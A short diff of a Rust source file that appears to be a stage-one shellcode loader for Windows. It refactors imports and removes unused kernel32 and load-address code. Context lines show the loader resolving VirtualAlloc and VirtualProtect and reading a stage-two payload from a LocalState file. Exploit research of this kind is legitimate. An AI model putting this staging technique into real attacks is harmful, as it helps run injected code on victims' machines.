@@ -9,7 +9,7 @@ use core::arch::asm;
 use core::mem::MaybeUninit;
 use core::panic::PanicInfo;
 
-use allocators::{WinGlobalAlloc, WinVirtualAlloc};
+use shellcode_utils::allocators::WinVirtualAlloc;
 use shellcode_utils::prelude::*;
 
 #[panic_handler]
@@ -22,8 +22,6 @@ type Stage2Fn = fn() -> u64;
 const STAGE2_ENV_FILENAME: &str = concat!(r#"%LOCALAPPDATA%\..\LocalState\stage2.bin"#, "\0");
 const STAGE1_ERROR_FILE_OPEN_FAILED: u64 = 0x100000000_00000001;
 const STAGE1_ERROR_FILE_READ_FAILED: u64 = 0x100000000_00000002;
-
-const STAGE2_PREFERRED_LOAD_ADDRESS: u64 = 0x01_40000000;
 
 #[used]
 #[no_mangle]
@@ -40,12 +38,6 @@ pub extern "C" fn main() -> u64 {
         return 0x404;
     }
     let kernelbase_ptr = kernelbase_ptr.unwrap();
-    let kernel32_ptr = get_kernel32(kernelbase_ptr);
-    if kernel32_ptr.is_none() {
-        return 0x404;
-    }
-
-    let kernel32_ptr = kernel32_ptr.unwrap();
 
     let VirtualAlloc = fetch_virtual_alloc(kernelbase_ptr);
     let VirtualProtect = fetch_virtual_protect(kernelbase_ptr);
